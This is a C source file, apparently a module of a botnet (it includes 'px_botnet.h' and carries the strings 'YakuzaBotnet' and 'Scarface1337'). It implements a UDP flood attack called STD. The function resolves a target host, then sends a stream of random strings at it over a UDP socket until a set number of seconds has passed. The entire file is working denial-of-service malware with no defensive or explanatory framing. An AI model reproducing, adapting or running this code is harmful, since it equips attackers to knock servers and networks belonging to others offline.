#include "../../includes/px_botnet.h"

void STD(unsigned char *ip, int port, int secs)
{
	int iSTD_Sock;
	iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
	time_t start = time(NULL);
	struct sockaddr_in sin;
	struct hostent *hp;
	hp = gethostbyname(ip);
	bzero((char *)&sin, sizeof(sin));
	bcopy(hp->h_addr, (char *)&sin.sin_addr, hp->h_length);
	sin.sin_family = hp->h_addrtype;
	sin.sin_port = port;
	unsigned int a = 0;
	while (1)
	{ // random std string
		char *randstrings[] = {"PozHlpiND4xPDPuGE6tq", "tg57YSAcuvy2hdBlEWMv", "VaDp3Vu5m5bKcfCU96RX", "UBWcPjIZOdZ9IAOSZAy6", "JezacHw4VfzRWzsglZlF", "3zOWSvAY2dn9rKZZOfkJ", "oqogARpMjAvdjr9Qsrqj", "yQAkUvZFjxExI3WbDp2g", "35arWHE38SmV9qbaEDzZ", "kKbPlhAwlxxnyfM3LaL0", "a7pInUoLgx1CPFlGB5JF", "yFnlmG7bqbW682p7Bzey", "S1mQMZYF6uLzzkiULnGF", "jKdmCH3hamvbN7ZvzkNA", "bOAFqQfhvMFEf9jEZ89M", "VckeqgSPaAA5jHdoFpCC", "CwT01MAGqrgYRStHcV0X", "72qeggInemBIQ5uJc1jQ", "zwcfbtGDTDBWImROXhdn", "w70uUC1UJYZoPENznHXB", "EoXLAf1xXR7j4XSs0JTm", "lgKjMnqBZFEvPJKpRmMj", "lSvZgNzxkUyChyxw1nSr", "VQz4cDTxV8RRrgn00toF", "YakuzaBotnet", "Scarface1337"};
		char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
		if (a >= 50)
		{
			send(iSTD_Sock, STD2_STRING, STD2_SIZE, 0);
			connect(iSTD_Sock, (struct sockaddr *)&sin, sizeof(sin));
			if (time(NULL) >= start + secs)
			{
				close(iSTD_Sock);
				return ;
			}
			a = 0;
		}
		a++;
	}
}
